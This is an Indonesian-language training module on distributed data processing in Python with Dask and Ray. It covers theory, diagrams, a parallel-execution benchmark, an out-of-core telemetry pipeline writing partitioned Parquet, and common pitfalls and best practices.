# SEKSI 01 — IDENTITAS MODUL

| Parameter | Spesifikasi |
| :--- | :--- |
| **Kurikulum** | Python Data Analysis & Engineering |
| **Kategori** | 02-Programming-Languages |
| **Modul** | Bab 09 Module 01: Skalabilitas Data & Komputasi Paralel Terdistribusi |
| **Tingkat Kesulitan** | Advanced / Production-Grade |
| **Prasyarat** | Python OOP & Functional Advanced, Memory Management & Profiling (Modul 08), Pandas Internal Architecture, Concurrency Basics (`threading`, `multiprocessing`) |
| **Tech Stack** | Python 3.11+, Dask, Ray, PyArrow, concurrent.futures, Multiprocessing Shared Memory |
| **Estimasi Durasi** | 8 – 10 Jam Pembelajaran Mandiri & Praktikum Intensif |

---

# SEKSI 02 — LEARNING OBJECTIVES

Setelah menyelesaikan modul ini, peserta didik memiliki kemampuan terukur untuk:

1. **Mendiagnosis Titik Jenuh Komputasi (Scale-Up vs Scale-Out):** Menganalisis batasan arsitektur *single-node* (CPU bound vs Memory bound) dan menentukan transisi optimal antara multiprocessing lokal, komputasi *out-of-core*, dan kluster terdistribusi menggunakan Hukum Amdahl dan Hukum Gustafson.
2. **Menguasai Dekomposisi Directed Acyclic Graph (DAG):** Merancang, membedah, dan mengoptimalkan representasi alur kerja analitik berbasis task graph lazy-evaluation untuk meminimalkan *data movement* dan *shuffling overhead*.
3. **Mengeliminasi Bottleneck Serialisasi:** Menjelaskan dan mengatasi biaya latensi pickling/unpickling dengan mengimplementasikan mekanisme zero-copy serialization menggunakan format Apache Arrow dan shared memory.
4. **Mengimplementasikan Pipeline Terdistribusi Skala Besar:** Membangun pipeline pemrosesan data multi-gigabyte/terabyte yang andal menggunakan Dask dan Ray, lengkap dengan penanganan *spill-to-disk*, toleransi kegagalan (*fault tolerance*), dan isolasi *worker*.
5. **Menegakkan Standar Keamanan & Observabilitas Tingkat Produksi:** Mengonfigurasi enkripsi mTLS antar-node, mendeteksi kerentanan deserialisasi kode berbahaya (*arbitrary code execution* via pickle), serta memantau metrik performa secara real-time via dashboard diagnostik terdistribusi.

---

# SEKSI 03 — MINDSET & MENTAL MODEL

### Pergeseran Paradigma: Dari "Memori Sentris" Menuju "Dataflow Graph Sentris"

Dalam pemrograman analisis data konvensional (misal: *native* Pandas), mental model yang digunakan bersifat **imperatif dan in-memory**:
> *"Baca seluruh file ke dalam RAM, operasikan secara sekuensial langkah demi langkah, lalu tulis hasilnya."*

Pendekatan ini runtuh seketika volume data melampaui kapasitas RAM fisik ($Data > RAM$), atau ketika komputasi bersifat CPU-bound dan terhambat oleh *Global Interpreter Lock* (GIL) Python.

```
Pendekatan Imperatif Tradisional (Pandas):
[Data di Disk] ---> [Load Seluruhnya ke RAM] ---> [Instruksi 1] ---> [Instruksi 2] ---> [OOM Crash]

Pendekatan Deklaratif Terdistribusi (Dask/Ray):
[Deklarasi Rencana Komputasi] ---> [Kompilasi Task DAG] ---> [Partisi Data (Chunks)] 
                                                                     |
                                      +------------------------------+------------------------------+
                                      |                              |                              |
                                [Worker 1: Chunk A]           [Worker 2: Chunk B]           [Worker 3: Chunk C]
                                      |                              |                              |
                                      +------------------------------+------------------------------+
                                                                     |
                                                       [Agregasi Reduksi / Shuffling]
                                                                     |
                                                            [Output Streaming]
```

### Mental Model: Operator Dapur Restoran Bintang Lima

Bayangkan sebuah dapur restoran:
- **Single-Threaded Core (Pandas):** Satu koki serba bisa yang mencoba memotong 1.000 kg bawang di atas satu meja kecil. Saat meja penuh, dapur macet (*Out of Memory*).
- **Multithreading (Threading):** Koki yang sama memiliki 4 tangan, tetapi hanya punya 1 pisau dapur (*GIL*). Dia hanya bisa memotong dengan satu tangan pada satu satuan waktu, meski bisa berganti tangan dengan sangat cepat.
- **Multiprocessing / Distributed (Dask/Ray):** Dapur memiliki 1 Head Chef (Scheduler) dan 16 Line Cook (Workers), masing-masing di meja kerja independen (*isolated memory space*). Head Chef tidak memotong bawang secara langsung; ia memecah resep masakan menjadi lembar instruksi modular (*DAG*), membagi 1.000 kg bawang ke dalam kantong-kantong 5 kg (*chunks/partitions*), lalu mendistribusikannya ke para koki. Bahan baku hanya dikirim jika meja koki siap, dan koki yang selesai segera menyetor hasil olahannya ke stasiun berikutnya.

---

# SEKSI 04 — ARSITEKTUR & DIAGRAM ALUR

Arsitektur komputasi terdistribusi dalam ekosistem Python modern memisahkan antara orkestrasi logika komputasi (*logical orchestration*) dan eksekusi fisik data (*physical data processing*).

```
+-----------------------------------------------------------------------------------+
|                                  CLIENT LAYER                                     |
|  - Python Script / Jupyter Notebook                                               |
|  - Mendefinisikan Dask DataFrame / Delayed / Ray Tasks / Actors                  |
|  - Membangun Logical Plan (Lazy Evaluation, belum ada komputasi aktual)           |
+-----------------------------------------+-----------------------------------------+
                                          | Submit Graph (DAG)
                                          v
+-----------------------------------------------------------------------------------+
|                                SCHEDULER LAYER                                    |
|  - Graph Optimizer: Pruning, Fuse Operations (Task Fusion)                        |
|  - Dependency Tracker: Memantau status dependencies antar task                   |
|  - Dynamic Resource Allocator: Menentukan penempatan task berdasarkan data locality|
+--------------------+------------------------------------+-------------------------+
                     | Assign Task                        | Assign Task
                     v                                    v
+------------------------------------+   +------------------------------------+
|          WORKER NODE 01            |   |          WORKER NODE 02            |
| +--------------------------------+ |   | +--------------------------------+ |
| | OS Process Engine              | |   | | OS Process Engine              | |
| | (Independent Python Engine)    | |   | | (Independent Python Engine)    | |
| +--------------------------------+ |   | +--------------------------------+ |
| +--------------------------------+ |   | +--------------------------------+ |
| | Task Execution Pool (Threads)  | |   | | Task Execution Pool (Threads)  | |
| +--------------------------------+ |   | +--------------------------------+ |
| +--------------------------------+ |   | +--------------------------------+ |
| | Worker Memory & Arrow Store    | |   | | Worker Memory & Arrow Store    | |
| | [Chunk A] -> [Processing]      | |   | | [Chunk B] -> [Processing]      | |
| +--------------------------------+ |   | +--------------------------------+ |
|                 | Spill to NVMe   | |   |                 | Spill to NVMe   | |
|                 v                  | |   |                 v                  | |
|        [Worker Local Disk]         | |   |        [Worker Local Disk]         | |
+-----------------+------------------+   +-----------------+------------------+
                  |                                        |
                  +<=========== Peer-to-Peer =============>+
                                Data Shuffling
                           (TCP / Zero-Copy Socket)
```

---

# SEKSI 05 — ANATOMI & MEKANISME INTERNAL

### 1. Global Interpreter Lock (GIL) dan Batasan Mutex
CPython mengimplementasikan *Global Interpreter Lock*, yaitu sebuah mutex mutual-exclusion yang mencegah banyak native OS threads mengeksekusi bytecode Python secara bersamaan dalam satu proses. 
- Operasi murni berbasis Python (manipulasi `dict`, `list`, alokasi obyek Python) wajib memegang GIL.
- Operasi numerik teroptimasi (misalnya algoritma NumPy C-extensions, PyArrow compute kernels) melepaskan GIL (*release GIL*) selama komputasi matriks berlangsung.
- Konsekuensi: Untuk beban kerja data analysis yang heavily reliant pada dynamic Python logic, penskalaan *multi-core* horizontal lokal wajib menggunakan arsitektur *multi-process* untuk mendapatkan interpreter instance independen.

### 2. Biaya Serialisasi (Serialization Overhead) & IPC
Komunikasi antar proses (IPC - Inter-Process Communication) menuntut data ditransformasikan dari representasi memori Python ke dalam aliran byte mentah (*byte stream*), kemudian direkonstruksi di proses tujuan:
- **Python Pickle / Cloudpickle:** Fleksibel karena mampu menserialisasi hampir seluruh obyek Python (termasuk fungsi closures), namun lambat dan boros CPU. Memerlukan *traversal* menyeluruh atas struktur pointer obyek dan alokasi memori ganda.
- **Apache Arrow Shared Memory (Plasma/SharedMemory):** Representasi data tabular berbasis format kolumnar biner standar. Memungkinkan beberapa proses membaca array data yang sama secara bersamaan (*Zero-Copy Deserialization*) tanpa biaya konversi representasi memori.

### 3. Task Graphs (DAG) dan Lazy Evaluation
Kerangka kerja seperti Dask tidak langsung mengeksekusi operasi aritmatika saat kode dievaluasi. Alih-alih mengeksekusi:
```python
result = (df[df['val'] > 100].groupby('category').mean())
```
Sistem membangun representasi internal berbentuk kamus dependensi:
```python
# Abstraksi konseptual Task Graph
{
    'read-chunk-1': (read_block, 'data.csv', 0, 10000),
    'filter-1': (filter_predicate, 'read-chunk-1', lambda x: x['val'] > 100),
    'group-sum-1': (partial_groupby_sum, 'filter-1', 'category'),
    'group-count-1': (partial_groupby_count, 'filter-1', 'category'),
    'finalize-aggregation': (combine_sums_and_counts, ['group-sum-1', ...], ['group-count-1', ...])
}
```
Mekanisme ini memungkinkan mesin penjadwal (Scheduler) melakukan optimasi mendalam: memangkas kolom yang tidak digunakan (*projection pushdown*), menggabungkan langkah filter dan baca (*predicate pushdown*), serta mengalokasikan memori seminimal mungkin.

---

# SEKSI 06 — DEEP DIVE KONSEP & TEORI

### 1. Amdahl’s Law vs Gustafson’s Law

Batas teoritis akselerasi komputasi paralel diatur oleh dua hukum fundamental.

#### Hukum Amdahl (Fixed Workload Size)
Jika ukuran masalah konstan, percepatan (*speedup*) dibatasi oleh fraksi sekuensial ($s$) yang tidak dapat diparalelkan:

$$S_{latency}(N) = \frac{1}{(1 - p) + \frac{p}{N}}$$

Dimana:
- $S_{latency}$ adalah akselerasi teoritis sistem.
- $p$ adalah proporsi instruksi program yang dapat diparalelkan ($0 \le p \le 1$).
- $N$ adalah jumlah core/prosesor.
- Jika $5\%$ dari kode Anda berjalan sekuensial ($p = 0.95$), maka walaupun Anda menggunakan $1.000$ core, speedup maksimum tidak akan pernah melebihi $\frac{1}{0.05} = 20\times$.

#### Hukum Gustafson (Scaled Workload Size)
Dalam analisis *Big Data*, ukuran data ditingkatkan seiring penambahan daya komputasi (*scaled speedup*):

$$S_{latency}(N) = N - (1 - p)(N - 1)$$

Hukum ini membuktikan bahwa penambahan node komputasi rasional secara efisiensi jika volume data yang dianalisis ikut ditingkatkan secara proporsional.

### 2. Kompleksitas Data Shuffling & Network Boundaries

Operasi paralel dibagi menjadi dua kategori fundamental:
- **Map-like (Embarrassingly Parallel / Narrow Dependency):** Operasi diterapkan mandiri pada tiap partisi tanpa dependensi luar (misal: `df['a'] * 2`, `filter()`). Kompleksitas transfer jaringan: $\mathcal{O}(1)$.
- **Reduce-like / Shuffle (Wide Dependency):** Operasi membutuhkan pertukaran data lintas partisi secara global (misal: `groupby().mean()`, `sort_values()`, `join()`).

```
Narrow Dependency (Map):              Wide Dependency (Shuffle):
Partition A1 ---> Partition B1        Partition A1 ---\ /--- Partition B1
Partition A2 ---> Partition B2                         X
Partition A3 ---> Partition B3        Partition A2 ---/ \--- Partition B2
```

Kompleksitas jaringan untuk shuffle $K$ partisi lintas $M$ worker melibatkan transmisi data all-to-all sebesar $\mathcal{O}(K^2)$, menyebabkan degradasi I/O drastis jika partisi tidak diatur secara cermat.

---

# SEKSI 07 — CONTOH KODE FUNDAMENTAL

Berikut implementasi fondasi komputasi paralel komparatif: perbandingan eksekusi *single-threaded*, *multiprocessing native*, dan *task-graph engine* (Dask Delayed) untuk komputasi analitik terdistribusi.

```python
"""
Fondasi Komputasi Paralel: Single-threaded vs ProcessPool vs Dask Delayed.
Mendemonstrasikan Task Graph generation, overhead profiling, dan memory isolation.
"""

from __future__ import annotations

import time
import math
from concurrent.futures import ProcessPoolExecutor
from typing import List, Tuple
import dask
import dask.delayed


def compute_heavy_statistical_transform(partition_id: int, records: List[float]) -> Tuple[int, float, float]:
    """
    Simulasi transformasi data analitik CPU-Bound non-vektor.
    Menghitung mean dan standar deviasi terbobot secara komputasional intensif.
    """
    if not records:
        return partition_id, 0.0, 0.0

    # Simulasi loop CPU intensif yang memicu penahanan interpreter
    acc_sum = 0.0
    for val in records:
        acc_sum += math.sin(val) ** 2 + math.cos(val) ** 2 * math.sqrt(abs(val))

    mean_val = acc_sum / len(records)
    
    variance_sum = 0.0
    for val in records:
        variance_sum += (val - mean_val) ** 2
    std_dev = math.sqrt(variance_sum / len(records))

    return partition_id, mean_val, std_dev


def generate_mock_partitions(num_partitions: int, records_per_partition: int) -> List[List[float]]:
    """Membuat partisi data numerik sintetik."""
    base_val = 42.195
    return [
        [base_val + float(i) for i in range(records_per_partition)]
        for _ in range(num_partitions)
    ]


def run_sequential(partitions: List[List[float]]) -> List[Tuple[int, float, float]]:
    """Eksekusi Sekuensial Murni (Baseline Single-Core)."""
    return [compute_heavy_statistical_transform(idx, p) for idx, p in enumerate(partitions)]


def run_process_pool(partitions: List[List[float]], max_workers: int = 4) -> List[Tuple[int, float, float]]:
    """Eksekusi Paralel Native via concurrent.futures.ProcessPoolExecutor."""
    with ProcessPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(compute_heavy_statistical_transform, idx, p)
            for idx, p in enumerate(partitions)
        ]
        return [f.result() for f in futures]


def run_dask_delayed(partitions: List[List[float]]) -> List[Tuple[int, float, float]]:
    """Eksekusi Paralel Berbasis Task Graph (DAG) menggunakan Dask Delayed."""
    tasks = []
    for idx, p in enumerate(partitions):
        # Lazy task wrapping: Belum ada komputasi yang dieksekusi di baris ini
        task = dask.delayed(compute_heavy_statistical_transform)(idx, p)
        tasks.append(task)
    
    # Kompilasi graph dependencies dan eksekusi terdistribusi
    combined_computation = dask.delayed(list)(tasks)
    return combined_computation.compute(scheduler="processes")


if __name__ == "__main__":
    NUM_PARTITIONS = 16
    RECORDS_PER_PARTITION = 350_000

    print(f"Menyiapkan {NUM_PARTITIONS} partisi data (@ {RECORDS_PER_PARTITION} rekaman)...")
    data_partitions = generate_mock_partitions(NUM_PARTITIONS, RECORDS_PER_PARTITION)

    # 1. Benchmark Sekuensial
    start_t = time.perf_counter()
    seq_results = run_sequential(data_partitions)
    seq_duration = time.perf_counter() - start_t
    print(f"[Sekuensial] Selesai dalam: {seq_duration:.4f} detik")

    # 2. Benchmark ProcessPoolExecutor
    start_t = time.perf_counter()
    pool_results = run_process_pool(data_partitions, max_workers=4)
    pool_duration = time.perf_counter() - start_t
    print(f"[ProcessPool 4 Cores] Selesai dalam: {pool_duration:.4f} detik | Speedup: {seq_duration / pool_duration:.2f}x")

    # 3. Benchmark Dask Task Graph
    start_t = time.perf_counter()
    dask_results = run_dask_delayed(data_partitions)
    dask_duration = time.perf_counter() - start_t
    print(f"[Dask Delayed Engine] Selesai dalam: {dask_duration:.4f} detik | Speedup: {seq_duration / dask_duration:.2f}x")

    # Validasi Hasil Identik
    assert seq_results == pool_results == dask_results, "Ketidaksesuaian data antar engine!"
    print("Integritas komputasi valid: seluruh hasil paralel deterministik dan identik.")
```

---

# SEKSI 08 — ANALISIS BARIS DEMI BARIS

Berikut adalah dekonstruksi mekanis atas implementasi kode pada Seksi 07:

1. **Baris 20–33 (`compute_heavy_statistical_transform`):**
   - Mendefinisikan operasi CPU-Bound murni. Loop eksplisit `math.sin` dan `math.cos` memaksa CPython interpreter terus mengeksekusi bytecode secara intensif di level runtime Python, sehingga dependensi terhadap GIL menjadi 100%. Fungsi ini merepresentasikan transformasi analitik khusus (*custom transformation*) yang tidak memiliki kernel C bawaan.
2. **Baris 48–50 (`run_sequential`):**
   - Menjalankan iterasi linear sederhana di satu thread primer. Menggunakan 1 core prosesor secara penuh, sementara core lain di CPU berada dalam kondisi *idle*. Waktu pemrosesan berskala linear: $\mathcal{O}(N \times M)$.
3. **Baris 53–60 (`run_process_pool`):**
   - `ProcessPoolExecutor(max_workers=4)`: Menginstansiasi 4 worker process terpisah via *fork* (Linux) atau *spawn* (Windows/macOS). Tiap proses memiliki OS PID dan memory space mandiri, mengabaikan limitasi GIL antar proses.
   - `executor.submit(...)`: Menserialisasi argumen fungsi (`idx` dan `p`) via `pickle`, menyalurkannya melalui IPC pipe OS.
   - `f.result()`: Titik sinkronisasi (*blocking synchronization barrier*). Proses utama berhenti menunggu hingga worker menyelesaikan eksekusi dan mengembalikan hasil serialized balik ke master thread.
4. **Baris 63–72 (`run_dask_delayed`):**
   - `dask.delayed(compute_heavy_statistical_transform)(idx, p)`: Fungsi **tidak** langsung dieksekusi. Dask membungkus pemanggilan ini ke dalam obyek `Delayed`. Obyek ini merepresentasikan satu node dalam Directed Acyclic Graph (DAG) berisi *key* unik, fungsi callable, dan referensi argumen.
   - `combined_computation = dask.delayed(list)(tasks)`: Menggabungkan 16 node independen menjadi node reduksi tunggal (list aggregator).
   - `.compute(scheduler="processes")`: Titik picu (*execution trigger*). Dask Graph Optimizer menyederhanakan DAG, mendeteksi ketiadaan dependensi antar node (`embarrassingly parallel`), lalu mengalokasikan eksekusi node tersebut ke process worker pool internal secara optimal.

---

# SEKSI 09 — STUDI KASUS NYATA

### Skenario Produksi: Pipeline Analisis Log Jaringan Skala TB (Telecom/IoT)

**Konteks Masalah:**
Sebuah penyedia infrastruktur IoT memiliki 50.000 gateway yang memancarkan log telemetri jaringan berformat JSON terkompresi GZIP, menghasilkan total **250 GB log per hari**. Data engineer harus menghitung agregasi windowing: mendeteksi lonjakan anomali rasio paket hilang (*packet loss spike*) per perangkat per interval 15 menit, lalu mengekspor metrik analitik ke format Apache Parquet yang terpartisi secara hierarkis per region.

**Limitasi Sistem Node:**
- Server analitik batch hanya memiliki RAM fisik sebesar **32 GB**.
- Upaya membaca dataset menggunakan `pandas.read_json()` menghasilkan instan crash: `Kernel Died: Out of Memory (OOM - Exit Code 137)` akibat amplifikasi alokasi memori obyek Python (ukuran raw text $\times 4$ hingga $\times 6$ dalam memori representasi Pandas DataFrame).

**Solusi Arsitektural:**
Mengimplementasikan **Dask Distributed Dataframe** yang berjalan di atas mode *LocalCluster* berkapasitas terkontrol:
1. Menetapkan ambang batas memori worker (*hard memory target limit*) sebesar 75% per proses untuk mencegah OOM.
2. Membaca dataset secara streaming partisi-per-partisi berbasis chunk disk (200MB terkompresi).
3. Menggunakan representasi PyArrow Data Types native guna menekan konsumsi memori pointer.
4. Mengompilasi alur agregasi dalam bentuk task graph teroptimasi, lalu mengeksekusi komputasi secara *out-of-core* dengan mekanisme *spill-to-disk* otomatis saat RAM melewati ambang toleransi.

---

# SEKSI 10 — IMPLEMENTASI KASUS NYATA & HANDS-ON CODE

Berikut adalah kode produksi lengkap dan mandiri untuk memproses pipeline analitik telemetri data berskala masif tanpa crash memory.

```python
"""
Production Pipeline: Out-Of-Core Network Telemetry Analytics Engine.
Menggunakan Dask Distributed, Apache Arrow, dan Parquet Target Partitioning.
"""

from __future__ import annotations

import os
import shutil
import tempfile
from pathlib import Path
import numpy as np
import pandas as pd
import dask.dataframe as dd
from dask.distributed import Client, LocalCluster


def generate_synthetic_telemetry_dataset(output_dir: Path, num_files: int = 8, rows_per_file: int = 150_000) -> None:
    """
    Generator dataset telemetri tiruan berskala multi-partisi ke format Parquet.
    Mensimulasikan data mentah yang melebihi buffer memori standar.
    """
    output_dir.mkdir(parents=True, exist_ok=True)
    device_pool = [f"dev-gw-{i:04d}" for i in range(1, 101)]
    region_pool = ["ap-southeast-1", "ap-southeast-2", "eu-central-1", "us-east-1"]

    print(f"[DataGen] Mengenerate {num_files} partisi data di: {output_dir} ...")
    
    np.random.seed(42)
    for file_idx in range(num_files):
        # Alokasi matriks data sintetik
        ts_start = pd.Timestamp("2026-03-30 00:00:00").value // 10**9
        ts_end = pd.Timestamp("2026-03-30 23:59:59").value // 10**9
        
        timestamps = pd.to_datetime(np.random.randint(ts_start, ts_end, size=rows_per_file), unit="s")
        devices = np.random.choice(device_pool, size=rows_per_file)
        regions = np.random.choice(region_pool, size=rows_per_file)
        bytes_sent = np.random.exponential(scale=5000, size=rows_per_file).astype(np.int32)
        bytes_recv = np.random.exponential(scale=8000, size=rows_per_file).astype(np.int32)
        packet_loss = np.random.uniform(0.0, 0.05, size=rows_per_file)
        
        # Injeksi anomali secara terkontrol (0.5% lonjakan kegagalan jaringan)
        anomaly_mask = np.random.rand(rows_per_file) < 0.005
        packet_loss[anomaly_mask] = np.random.uniform(0.25, 0.95, size=np.sum(anomaly_mask))

        df_partition = pd.DataFrame({
            "timestamp": timestamps,
            "device_id": devices,
            "region": regions,
            "bytes_sent": bytes_sent,
            "bytes_recv": bytes_recv,
            "packet_loss_rate": packet_loss
        })

        # Kompresi tingkat produksi via snappy
        file_path = output_dir / f"telemetry_part_{file_idx:03d}.parquet"
        df_partition.to_parquet(file_path, engine="pyarrow", compression="snappy", index=False)
        
    print("[DataGen] Penyiapan raw telemetry chunks selesai.")


def execute_scalable_pipeline(source_dir: Path, target_dir: Path) -> None:
    """
    Eksekusi alur pemrosesan data out-of-core terdistribusi.
    """
    # 1. Konfigurasi Kluster Lokal Terisolasi
    # Menetapkan 4 worker proses, masing-masing dibatasi 1 thread per proses
    # untuk menghindari thread contention dan isolasi memori strict 2GB.
    cluster = LocalCluster(
        n_workers=4,
        threads_per_worker=1,
        memory_limit="2GB",
        processes=True,
        dashboard_address=":8787",
        silence_logs=30
    )
    client = Client(cluster)
    print(f"[Orchestration] Distributed Cluster Berjalan: Dashboard di {client.dashboard_link}")

    try:
        # 2. Lazy Read Menggunakan PyArrow Dtypes Backend
        print("[Engine] Membaca Partisi Parquet secara Lazy via Apache Arrow...")
        telemetry_ddf = dd.read_parquet(
            source_dir / "*.parquet",
            engine="pyarrow",
            dtype_backend="pyarrow"
        )

        # 3. Validasi Metadata Partisi & Shape Inspeksi Lazy
        print(f"[DAG Plan] Jumlah Partisi Terbaca: {telemetry_ddf.npartitions}")
        print(f"[Schema Detection]\n{telemetry_ddf.dtypes}")

        # 4. Pipeline Transformasi & Filtering Out-of-Core
        # Mendeteksi event network latency kritis
        anomaly_ddf = telemetry_ddf[telemetry_ddf["packet_loss_rate"] > 0.15]

        # 5. Agregasi Terdistribusi Multi-Dimensi (Wide Dependency Shuffle)
        # Menghitung total volume transfer dan rata-rata packet loss per region dan device
        aggregated_metrics = (
            anomaly_ddf.groupby(["region", "device_id"])
            .agg(
                incident_count=("packet_loss_rate", "count"),
                avg_packet_loss=("packet_loss_rate", "mean"),
                total_bytes_sent=("bytes_sent", "sum"),
                total_bytes_recv=("bytes_recv", "sum")
            )
            .reset_index()
        )

        # Penambahan Feature Engineering Terkomputasi
        aggregated_metrics["total_network_traffic_mb"] = (
            aggregated_metrics["total_bytes_sent"] + aggregated_metrics["total_bytes_recv"]
        ) / (1024 * 1024)

        # 6. Materialisasi & Penulisan Terdistribusi ke Parquet Partisi Target
        print(f"[Materialization] Mengekspor hasil agregasi ke {target_dir}...")
        if target_dir.exists():
            shutil.rmtree(target_dir)

        # Tulis langsung partisi terdistribusi tanpa menarik seluruh data ke master driver RAM
        aggregated_metrics.to_parquet(
            target_dir,
            engine="pyarrow",
            compression="zstd",
            partition_on=["region"],
            write_index=False
        )
        print("[Materialization] Ekspor Parquet terdistribusi sukses.")

        # 7. Validasi Parsial Menggunakan Head (Hanya menarik representasi kecil ke Driver)
        sample_driver_view = aggregated_metrics.head(5)
        print("\n[Preview 5 Rekaman Teratas dari Graph Materialisasi]:")
        print(sample_driver_view)

    finally:
        # Graceful cleanup koneksi cluster
        client.close()
        cluster.close()
        print("[Orchestration] Distributed Cluster ditutup secara aman.")


if __name__ == "__main__":
    base_workspace = Path(tempfile.mkdtemp(prefix="distributed_scale_lab_"))
    raw_telemetry_path = base_workspace / "raw_telemetry"
    curated_analytics_path = base_workspace / "curated_network_metrics"

    try:
        generate_synthetic_telemetry_dataset(raw_telemetry_path, num_files=6, rows_per_file=100_000)
        execute_scalable_pipeline(raw_telemetry_path, curated_analytics_path)
    finally:
        # Hapus direktori sementara setelah simulasi tuntas
        shutil.rmtree(base_workspace, ignore_errors=True)
        print(f"[Cleanup] Direktori isolasi lab {base_workspace} berhasil dibersihkan.")
```

---

# SEKSI 11 — TRADE-OFFS & ANALISIS PERBANDINGAN

Memilih mesin pemrosesan data memerlukan kompromi ketat antara kemudahan implementasi, batas memori, overhead latensi, dan kompleksitas arsitektur.

| Mesin / Engine | Batas Skala Memori | Biaya Startup / Latensi | Kompleksitas Arsitektural | Overhead Jaringan / Shuffling | Kasus Penggunaan Optimal |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Native Pandas** | Strict In-Memory ($< 1\times$ RAM Fisik) | Nol (Langsung memori lokal) | Sangat Rendah (Single Process) | Tidak Ada | Eksplorasi cepat dataset kecil ($< 2$ GB), prototyping analisis ad-hoc. |
| **Polars (Streaming Engine)** | Out-of-Core Single Node ($3\times - 5\times$ RAM Fisik via Disk Streaming) | Mikro-detik (Engine Rust native) | Rendah (Library level, zero config) | Tidak Ada (Shared memory lokal) | Penskalaan vertikal (*Scale-Up*) single workstation/server dengan core besar (32–128 vCPU) tanpa setup kluster. |
| **Dask Distributed** | Terdistribusi Tak Terbatas (Node Cluster + Local Disk Spill) | Ratusan Milidetik (Kompilasi Graph & IPC) | Menengah (Master Scheduler + Distributed Workers) | Menengah (Optimized TCP sockets, Cloudpickle serialization) | Dataset $10\text{ GB} - 5\text{ TB}$, integrasi ketat dengan ekosistem Scikit-Learn/NumPy/Pandas. |
| **Ray Core / Datasets** | Terdistribusi Masif + Dynamic Tasks & Actors | Ratusan Milidetik (Ray Core Daemon, GCS) | Menengah-Tinggi (Cluster Head Node, GCS, Plasma Object Store) | Sangat Rendah Lintas Worker (Zero-Copy Shared Memory via Plasma) | Analitik pipeline heterogen yang beririsan dengan Distributed ML Training (PyTorch/RLlib) dan stateful services. |
| **Apache Spark (PySpark)** | Terdistribusi Skala Petabyte | Tinggi (Inisialisasi JVM, Py4J Bridge Context) | Tinggi (Memerlukan Yarn/K8s/Mesos, JVM tuning, GC tuning) | Tinggi (Tergantung tungsten engine, shuffle buffer spill disk) | Pipeline ETL Enterprise skala raksasa ($> 5\text{ TB}$), integrasi ekosistem Hadoop/Data Lakehouse legasi. |

---

# SEKSI 12 — EDGE CASES & PITFALLS

1. **Partition Data Skew (Ketimpangan Distribusi Partisi):**
   - *Mekanisme Kerusakan:* Saat melakukan `groupby("region")`, jika 80% data berasal dari region `us-east-1` dan hanya 20% tersebar di 3 region lain, worker yang menangani partisi `us-east-1` akan menghabiskan seluruh memori (OOM), sementara worker lain menganggur (*straggler phenomenon*).
   - *Mitigasi:* Tambahkan *salt key* sintetik ke dalam partisi sebelum shuffling: `df['skew_key'] = df['region'] + "_" + (df.index % 4).astype(str)`.
2. **Serializing Non-Picklable Objects:**
   - *Mekanisme Kerusakan:* Menyerahkan referensi koneksi database terbuka (misal: `psycopg2.connection`), soket jaringan, thread lock, atau file handle yang sedang aktif ke dalam argumen Dask/Ray tasks:
     ```python
     # FATAL: Memicu TypeError: cannot pickle '_thread.lock' object
     conn = sqlite3.connect("data.db")
     dask.delayed(process)(conn, chunk)
     ```
   - *Mitigasi:* Inisialisasi koneksi secara lokal di dalam worker execution scope, atau gunakan *Ray Actors* / *Dask Worker Plugins* untuk mengelola lifecycle koneksi eksternal.
3. **Graph Serialization Bloat (Graph Ledakan Memori Driver):**
   - *Mekanisme Kerusakan:* Membuat jutaan delayed task kecil dalam loop Python (`for i in range(1_000_000): dask.delayed(...)`). Ukuran deskripsi DAG itu sendiri bisa mencapai gigabyte dan membuat Driver scheduler mengalami crash sebelum komputasi fisik dimulai.
   - *Mitigasi:* Batasi jumlah partisi ideal antara **100 hingga beberapa ribu partisi**. Gabungkan instruksi granular menggunakan chunk-based vectorized operations.

---

# SEKSI 13 — COMMON MISTAKES & CARA MENGHINDARINYA

### 1. Memanggil `.compute()` Terlalu Dini atau Tidak Sengaja
```python
# SALAH: Menghancurkan efisiensi out-of-core dan lazy evaluation
ddf = dd.read_parquet("s3://huge-bucket/*.parquet")
for col in ddf.columns:
    # Memaksa full scan & agregasi ke Driver Memory berulang-ulang di tiap loop!
    unique_vals = ddf[col].compute().unique()
    print(unique_vals)

# BENAR: Rangkum komputasi menjadi graf gabungan tunggal
ddf = dd.read_parquet("s3://huge-bucket/*.parquet")
computations = {col: ddf[col].drop_duplicates() for col in ddf.columns}
# Eksekusi paralel tunggal menyeluruh
all_uniques = dask.compute(computations)[0]
```

### 2. Menggunakan Iterasi Baris (`iterrows`) pada Distributed Frame
```python
# SALAH: Menghancurkan performa dan memicu overhead IPC masif
for idx, row in ddf.iterrows():
    process(row)

# BENAR: Gunakan map_partitions dengan vectorization
def vectorized_batch_processor(pdf_chunk: pd.DataFrame) -> pd.DataFrame:
    # pdf_chunk adalah Pandas DataFrame native di worker lokal
    pdf_chunk["derived_metric"] = np.log1p(pdf_chunk["bytes_sent"])
    return pdf_chunk

ddf_transformed = ddf.map_partitions(vectorized_batch_processor, meta=ddf._meta)
```

### 3. Menangkap (*Capturing*) Variabel Global Berukuran Besar ke dalam Closure
```python
# SALAH: Global dictionary di-serialize dan dikirim berulang ke setiap task
large_lookup_table = {i: f"val_{i}" for i in range(10_000_000)}  # ~500 MB

@dask.delayed
def parse_record(val):
    return large_lookup_table.get(val, "unknown")

# BENAR: Manfaatkan Broadcast Variable (Dask Client Scatter)
[scattered_lookup] = client.scatter([large_lookup_table], broadcast=True)

@dask.delayed
def parse_record_optimized(val, lookup):
    return lookup.get(val, "unknown")

tasks = [parse_record_optimized(val, scattered_lookup) for val in raw_inputs]
```

---

# SEKSI 14 — BEST PRACTICES & KONVENSI INDUSTRI

1. **Aturan Ukuran Partisi (The 100MB – 200MB Rule of Thumb):**
   - Ukuran data mentah per partisi di disk yang paling optimal berada pada rentang **100 MB hingga 200 MB (uncompressed)**.
   - Partisi $< 10\text{ MB}$ menimbulkan overhead scheduling time lebih besar daripada execution time data. Partisi $> 1\text{ GB}$ memicu risiko memory thrashing dan kegagalan alokasi buffer.
2. **Columnar Projection & Predicate Pushdown:**
   - Selalu tentukan kolom yang diperlukan secara eksplisit (`columns=['col_a', 'col_b']`) saat membaca dari format kolumnar (Parquet/ORC). Ini menghindari transfer I/O untuk 90% data yang tidak relevan.
3. **Struktur Penamaan File Partisi yang Deterministik:**
   - Standar industri penulisan partisi terdistribusi:  
     `s3://lake-curated/telemetry/year=2026/month=03/part-{partition_index:05d}-{uuid}.parquet`
